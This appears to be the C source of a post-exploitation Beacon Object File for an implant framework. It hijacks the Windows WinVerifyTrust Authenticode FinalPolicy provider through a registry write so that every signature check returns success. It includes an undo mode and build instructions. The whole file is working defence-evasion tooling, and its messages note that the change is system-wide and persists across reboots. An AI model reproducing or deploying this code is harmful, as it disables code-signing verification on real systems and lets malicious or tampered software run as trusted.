/*
 * tmb_finalpolicy.c - FinalPolicy hijack via SoftpubCleanup
 *
 * Single registry write redirects WinVerifyTrust FinalPolicy to
 * wintrust!SoftpubCleanup. Every signature check returns success.
 *
 * Args (via BeaconDataParse):
 *   short: action (0 = hijack, 1 = clean)
 *
 * Build: x86_64-w64-mingw32-gcc -o bofs/bin/tmb_finalpolicy.o -c bofs/src/tmb_finalpolicy.c -I bofs/include -Wall
 */

#include "tmb_bof.h"

void go(char *args, int alen) {
    if (!tmb_init()) { TMB_ERR("Failed to resolve NT API."); return; }

    datap parser;
    BeaconDataParse(&parser, args, alen);
    short action = BeaconDataShort(&parser); /* 0=hijack, 1=clean */

    /* Authenticode action GUID */
    WSTR_INIT(guid, L'{',L'0',L'0',L'A',L'A',L'C',L'5',L'6',L'B',L'-',L'C',L'D',L'4',L'4',L'-',L'1',L'1',L'd',L'0',L'-',L'8',L'C',L'C',L'2',L'-',L'0',L'0',L'C',L'0',L'4',L'F',L'C',L'2',L'9',L'5',L'E',L'E',L'}');

    wchar_t path[256];
    tmb_build_finalpolicy_path(guid, path);

    if (action == 0) {
        /* Hijack: set FinalPolicy to SoftpubCleanup */
        STR_WINTRUST(dll);
        STR_SOFTPUBCLEANUP(func);
        if (tmb_reg_write_sip(path, dll, func)) {
            TMB_OK("FinalPolicy hijacked. All signature checks return success.");
            TMB_WARN("System-wide. Affects all new processes. Survives reboot.");
            TMB_WARN("Log out and log back in for full effect.");
            TMB_INFO("Undo: tmb_finalpolicy 1");
        } else {
            TMB_ERR("FinalPolicy write failed. Verify admin privileges.");
        }
    } else {
        /* Clean: restore to SoftpubAuthenticode */
        STR_WINTRUST(dll);
        STR_SOFTPUBAUTHENTICODE(func);
        if (tmb_reg_write_sip(path, dll, func)) {
            TMB_OK("FinalPolicy restored to SoftpubAuthenticode.");
            TMB_WARN("Log out and log back in for full effect.");
        } else {
            TMB_ERR("FinalPolicy restore failed.");
        }
    }
}
